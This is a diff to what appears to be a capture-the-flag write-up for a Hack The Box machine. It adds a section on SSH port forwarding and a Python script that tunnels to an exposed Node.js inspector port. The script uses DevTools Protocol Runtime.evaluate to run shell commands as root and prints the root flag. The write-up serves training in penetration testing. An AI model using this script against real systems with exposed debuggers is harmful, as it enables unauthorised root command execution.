@@ -1664,19 +1664,59 @@ Because it is bound to `127.0.0.1`, it is not directly reachable from the attack
 <br>
 </div>
 
-###
+### 5.3 SSH Port Forwarding
 ```shell
-                                                                                          
 ┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/Reactor]
 └─$ ssh -L 9229:127.0.0.1:9229 engineer@10.129.13.245 -N &
 [1] 152372
-                                                                                          
+
 ┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/Reactor]
 └─$ 
 [1]  + suspended (tty output)  ssh -L 9229:127.0.0.1:9229 engineer@10.129.13.245 -N
 ┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/Reactor]
 └─$ vi privsec.py
-                                                                                          
+
+┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/Reactor]
+└─$ cat privsec.py                                        
+import json, websocket, urllib.request
+
+# Get WebSocket URL
+with urllib.request.urlopen('http://127.0.0.1:9229/json') as response:
+    data = json.loads(response.read().decode())
+    ws_url = data[0]['webSocketDebuggerUrl']
+
+ws = websocket.create_connection(ws_url)
+
+def send_and_wait(ws, msg_id, method, params=None):
+    """Send CDP command, skip events, return response with matching ID."""
+    ws.send(json.dumps({"id": msg_id, "method": method, "params": params or {}}))
+    for _ in range(20):
+        result = json.loads(ws.recv())
+        if result.get('id') == msg_id:
+            return result
+    return None
+
+msg_id = 1
+
+# Enable Runtime execution context
+send_and_wait(ws, msg_id, "Runtime.enable")
+msg_id += 1
+
+# Verify running as root
+result = send_and_wait(ws, msg_id, "Runtime.evaluate", {
+    "expression": "process.getuid()",
+    "returnByValue": True
+})
+# Returns: {'result': {'type': 'number', 'value': 0}}  <- UID=0 (root)!
+msg_id += 1
+
+# Read root flag
+result = send_and_wait(ws, msg_id, "Runtime.evaluate", {
+    "expression": "process.mainModule.require('child_process').execSync('cat /root/root.txt').toString()",
+    "returnByValue": True
+})
+print(result['result']['result']['value'])
+
 ┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/Reactor]
 └─$ python3 privsec.py                                     
 fab4252120bf323ccadc3b9be935bfa0
